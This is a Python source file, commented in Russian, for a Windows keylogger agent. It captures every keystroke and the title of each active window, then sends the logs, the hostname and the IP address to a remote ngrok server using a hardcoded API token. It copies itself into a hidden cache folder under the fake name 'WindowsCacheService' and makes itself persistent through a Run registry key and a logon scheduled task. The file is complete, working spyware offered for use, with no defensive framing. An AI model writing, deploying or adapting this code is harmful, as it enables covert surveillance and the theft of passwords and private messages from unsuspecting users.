import os, sys, time, json, socket, threading, subprocess
from datetime import datetime
import pygetwindow as gw

SERVER_URL = "https://overpuissant-zoie-educable.ngrok-free.dev"
API_TOKEN = "38qz3h1EgkG1vYPOVFOTsOQLs0S_6pcExEtjffYk7djngbFpz"

HEARTBEAT_INTERVAL = 60
LOG_SEND_INTERVAL = 10

LOCALAPPDATA = os.environ.get("LOCALAPPDATA")
AGENT_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "INetCache", "Cache")
TARGET_NAME = "agent.exe"
TARGET_PATH = os.path.join(AGENT_DIR, TARGET_NAME)

try:
    import urllib.request as urllib2
except:
    import urllib2

def http_post(url, data, headers=None, timeout=10):
    try:
        if headers is None:
            headers = {}
        headers['Content-Type'] = 'application/json'
        req = urllib2.Request(url, data=json.dumps(data).encode('utf-8'), headers=headers)
        response = urllib2.urlopen(req, timeout=timeout)
        return response.getcode() == 200
    except:
        return False

full_log = "Агент запущен.\n"
current_window = ""
log_lock = threading.Lock()

def get_active_window():
    global full_log, current_window
    while True:
        try:
            win = gw.getActiveWindowTitle()
            if win and win != current_window:
                with log_lock:
                    current_window = win
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    full_log += f"\n[{timestamp} | Окно: {current_window}]\n"
        except:
            pass
        time.sleep(0.5)

def keystroke_logger():
    """Кейлоггер через pynput с буфером символов"""
    global full_log
    from pynput import keyboard
    
    buffer = ""
    
    def on_press(key):
        nonlocal buffer
        try:
            buffer += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                buffer += " "
            elif key == keyboard.Key.enter:
                if buffer.strip():
                    with log_lock:
                        full_log += buffer.strip() + " [ENTER]\n"
                buffer = ""
            elif key == keyboard.Key.backspace:
                buffer = buffer[:-1] if buffer else ""
            elif key == keyboard.Key.tab:
                buffer += " [TAB] "
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def send_heartbeat():
    while True:
        try:
            payload = {
                "agent_id": socket.gethostname(),
                "status": "alive",
                "active_window": current_window,
                "uptime": int(time.time() - start_time),
                "ip": socket.gethostbyname(socket.gethostname())
            }
            http_post(f"{SERVER_URL}/api/heartbeat", payload, {"X-API-KEY": API_TOKEN})
        except:
            pass
        time.sleep(HEARTBEAT_INTERVAL)

def send_logs():
    global full_log
    while True:
        with log_lock:
            if full_log:
                data_to_send = full_log
                full_log = ""
            else:
                data_to_send = None
        if data_to_send:
            try:
                http_post(
                    f"{SERVER_URL}/api/events",
                    {"agent_id": socket.gethostname(), "events": [{"event_type": "full_log", "details": data_to_send}]},
                    {"X-API-KEY": API_TOKEN}
                )
            except:
                try:
                    with open(os.path.join(AGENT_DIR, "backup.log"), "a", encoding="utf-8") as f:
                        f.write(data_to_send)
                except:
                    pass
        time.sleep(LOG_SEND_INTERVAL)

def install_self():
    current_path = os.path.abspath(sys.argv[0])
    if current_path.lower() == TARGET_PATH.lower():
        return
    try:
        os.makedirs(AGENT_DIR, exist_ok=True)
        import shutil
        shutil.copy2(current_path, TARGET_PATH)
        subprocess.run(['attrib', '+h', '+s', TARGET_PATH], capture_output=True)
        subprocess.run(['reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'WindowsCacheService', '/t', 'REG_SZ', '/d', f'"{TARGET_PATH}"', '/f'], capture_output=True)
        subprocess.run(['schtasks', '/create', '/tn', 'WindowsCacheService', '/tr', f'"{TARGET_PATH}"', '/sc', 'ONLOGON', '/ru', os.getlogin(), '/f'], capture_output=True)
        subprocess.Popen([TARGET_PATH], creationflags=0x08000000)
        sys.exit(0)
    except:
        pass

start_time = time.time()

def main():
    install_self()
    threading.Thread(target=get_active_window, daemon=True).start()
    threading.Thread(target=keystroke_logger, daemon=True).start()
    threading.Thread(target=send_heartbeat, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()